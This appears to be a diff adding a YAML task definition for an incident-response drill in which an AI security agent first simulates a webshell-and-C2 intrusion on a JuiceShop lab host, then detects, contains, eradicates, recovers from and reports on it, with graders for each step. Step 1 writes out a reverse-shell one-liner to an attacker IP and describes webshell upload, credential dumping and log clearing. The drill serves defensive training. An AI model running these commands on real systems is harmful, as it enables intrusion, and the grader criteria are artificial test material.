@@ -1,0 +1,201 @@
+id: "p7-ir-drill"
+title: "Production Trial C — IR Drill (침해 대응 훈련)"
+description: |
+  Red team 시뮬레이션 침해 → Blue team(Bastion) 자동 6단계 IR → IoC 추출 → STIX/TAXII 공유.
+  paper §7.4 Track C 시나리오 C. 격리(MTTC) ≤10분 목표.
+phase: "ir_drill"
+sla_minutes: 60
+hitl_steps: [4]  # 근절(eradication) 시 process kill / 백업 복원 운영자 승인
+kpi_targets:
+  mttc_minutes_max: 10  # Mean Time To Containment
+  six_stages_completed: true
+  ioc_extraction_recall_min: 0.9
+  same_attack_blocked_after: true
+
+drill_scenarios:
+  - id: "drill-01-webshell-c2"
+    name: "웹셸 + C2 통신"
+    red_steps:
+      - "JuiceShop SSRF 취약점으로 웹셸 업로드"
+      - "웹셸 reverse shell — 198.51.100.66:4444"
+      - "lateral movement — 동일 서브넷 SSH brute"
+      - "credential dump"
+    blue_expected_detections:
+      - "Wazuh: file integrity (uploaded webshell)"
+      - "Suricata: outbound TCP to 198.51.100.0/24"
+      - "Wazuh: SSH auth failures spike"
+  - id: "drill-02-ransomware"
+    name: "Ransomware 시뮬레이션"
+    red_steps:
+      - "phishing PDF → office macro → encrypted persistence"
+      - "AES-256 file encryption (sandbox files only)"
+      - "ransom note + .locked extension"
+    blue_expected_detections:
+      - "Wazuh: massive file rename (entropy spike)"
+      - "Suricata: SMB anomaly"
+  - id: "drill-03-insider-exfil"
+    name: "내부자 데이터 유출"
+    red_steps:
+      - "정당한 인증으로 customer DB 접근"
+      - "USB / cloud sync 로 데이터 복사 (시뮬레이션 = scp to attacker)"
+      - "log clear 시도"
+    blue_expected_detections:
+      - "Wazuh: large file transfer to non-corp dest"
+      - "DLP: PII pattern in outbound stream"
+
+steps:
+  - order: 1
+    instruction: "Red team 시뮬레이션 시작 — webshell upload + reverse shell."
+    bastion_prompt: "JuiceShop 의 file upload 또는 SSRF 통해 /tmp/.cache/.x.php 웹셸을 web 호스트에 배치. 그 후 attacker(198.51.100.66:4444) 로 reverse shell 시도. 모든 명령 stdout 보존."
+    skill_hint: "shell + curl + bash"
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "shell"
+      semantic:
+        intent: "MITRE T1505.003 (Web Shell) + T1071 (Application Layer Protocol C2). Drill 의 attack 단계."
+        success_criteria:
+          - "웹셸 파일 업로드 (PHP one-liner 또는 동등)"
+          - "reverse shell 명령 시도 (bash -i, ncat, python, php pcntl)"
+          - "외부 attacker IP (198.51.100.x) 사용"
+        acceptable_methods:
+          - "curl -F file=@x.php POST"
+          - "JuiceShop /api/Files upload"
+          - "bash -c 'bash -i >& /dev/tcp/198.51.100.66/4444 0>&1'"
+        negative_signs:
+          - "shell 명령 만 + 업로드 입증 누락"
+          - "내부 IP 사용 (198.51.100 외)"
+
+  - order: 2
+    instruction: "Wazuh 알람 분석 — webshell 또는 outbound C2 alert 자동 추출."
+    bastion_prompt: "siem 의 Wazuh alert 중 최근 30분 내 webshell / php upload / suspicious outbound 키워드 alert 추출. timestamp + agent + rule + description."
+    skill_hint: "analyze_logs or shell + jq"
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "alert"
+      semantic:
+        intent: "MITRE M1031 + M1041 (Restrict Web-Based Content) — IR 의 Detection 단계."
+        success_criteria:
+          - "Wazuh /var/ossec/logs/alerts/alerts.log 또는 alerts.json 에서 추출"
+          - "최근 30분 windowing"
+          - "최소 1건 webshell/upload/outbound 관련 alert"
+        acceptable_methods:
+          - "tail -1000 alerts.log + grep"
+          - "Wazuh API GET /alerts"
+          - "Splunk index=wazuh sourcetype=alerts"
+          - "analyze_logs skill"
+        negative_signs:
+          - "alert dump + filter 누락"
+          - "30분 윈도우 미적용"
+
+  - order: 3
+    instruction: "Containment — 영향 호스트(web 10.20.30.80) 외부 통신 즉시 차단."
+    bastion_prompt: "secu(10.20.30.1) 의 nftables 에 web(10.20.30.80) → 198.51.100.0/24 outbound drop rule 즉시 추가. MTTC 측정 (탐지 시각 → 차단 시각)."
+    skill_hint: "shell + nft add"
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "nft"
+      semantic:
+        intent: "MITRE M1037 (Filter Network Traffic) — IR 의 Containment. MTTC ≤10분 목표."
+        success_criteria:
+          - "nft 또는 iptables 으로 outbound 198.51.100.0/24 차단"
+          - "rule 검증 (nft list ruleset)"
+          - "차단 시각 timestamp 명시"
+        acceptable_methods:
+          - "ssh secu + nft add rule"
+          - "ansible -m iptables"
+          - "AWS Security Group 수정"
+        negative_signs:
+          - "rule 추가 + 검증 누락"
+          - "단일 IP 만 + 대역 누락"
+
+  - order: 4
+    instruction: "[HITL] Eradication — 웹셸 파일 격리 + malicious process kill (운영자 승인 후)."
+    bastion_prompt: "web(10.20.30.80) 에서 /tmp/.cache/.x.php 파일을 /quarantine 으로 이동 + 관련 process kill. 운영자 승인 대기."
+    skill_hint: "shell + ssh + mv + pkill"
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "quarantine"
+      semantic:
+        intent: "MITRE T1495 mitigation + IR Eradication — 격리 디렉토리 이동 + process termination + chain-of-custody 보존."
+        success_criteria:
+          - "ssh web + mv 으로 /quarantine/ 이동"
+          - "관련 process (ncat / php / bash 자식) kill"
+          - "이동 전 sha256 + 원본 path 기록"
+        acceptable_methods:
+          - "ssh web + mv + pkill"
+          - "Wazuh active response"
+          - "EDR isolate-process"
+        negative_signs:
+          - "삭제 (rm) → 증거 손실"
+          - "process kill 누락"
+
+  - order: 5
+    instruction: "Recovery — 깨끗한 백업 복원 + JuiceShop 재배포."
+    bastion_prompt: "web 에 깨끗한 vuln-sites 빌드 재배포. docker-compose down + clean rebuild + smoke test."
+    skill_hint: "shell + docker-compose"
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "smoke"
+      semantic:
+        intent: "MITRE Recovery — 정상 상태 복원 + 재공격 차단 입증."
+        success_criteria:
+          - "docker-compose down + up --build"
+          - "smoke test (curl /api/Status 200)"
+          - "동일 attack 재시도 차단 확인 (step 1 명령 reproduce → 차단)"
+        acceptable_methods:
+          - "ansible-playbook restore-juiceshop.yml"
+          - "ssh + docker-compose down/up"
+          - "AWS auto-recovery"
+        negative_signs:
+          - "재배포 만 + smoke test 누락"
+          - "재공격 차단 검증 없음"
+
+  - order: 6
+    instruction: "Lessons Learned — timeline + MTTC + 개선 권고 markdown 보고서."
+    bastion_prompt: "drill 시작 → containment → recovery 의 timeline. MTTC 계산 (탐지→차단). 다음 drill 까지 개선 사항 (rule 추가 / SOAR playbook / training) 1개 이상."
+    skill_hint: "shell + heredoc"
+    target_vm: manager
+    verify:
+      type: "output_contains"
+      expect: "MTTC"
+      semantic:
+        intent: "ISO 27035 + NIST SP 800-61 — Lessons Learned 단계, MTTC KPI 측정."
+        success_criteria:
+          - "timeline (시작 / 탐지 / 차단 / 복구 시각)"
+          - "MTTC 계산 (분 단위)"
+          - "개선 권고 1개 이상"
+        acceptable_methods:
+          - "shell + heredoc"
+          - "Confluence wiki + REST API"
+          - "TheHive case → afterAction"
+        negative_signs:
+          - "timeline 만 + MTTC 누락"
+          - "권고 누락"
+
+  - order: 7
+    instruction: "Sharing — IoC 추출 + STIX 2.1 패키지 작성 (ISAC 공유 시뮬레이션)."
+    bastion_prompt: "이번 drill 의 IoC: webshell hash, attacker IP (198.51.100.66), reverse shell command pattern. STIX 2.1 indicator + observed-data 객체로 변환."
+    skill_hint: "ioc_export skill or shell + python"
+    target_vm: manager
+    verify:
+      type: "output_contains"
+      expect: "indicator"
+      semantic:
+        intent: "MITRE M1056 (Pre-compromise) + ISAC sharing — 다른 조직 보호 위한 IoC 표준 형식 공유."
+        success_criteria:
+          - "STIX 2.1 indicator 객체 (pattern + valid_from)"
+          - "observed-data 객체 (IP / hash / command)"
+          - "최소 3 IoC 항목 (file hash + IP + command pattern)"
+        acceptable_methods:
+          - "ioc_export skill format=stix"
+          - "python + stix2 library"
+          - "MISP API push event"
+          - "OpenCTI ingest"
+        negative_signs:
+          - "JSON dump 만 + STIX schema 부적합"
+          - "단일 IoC 만"
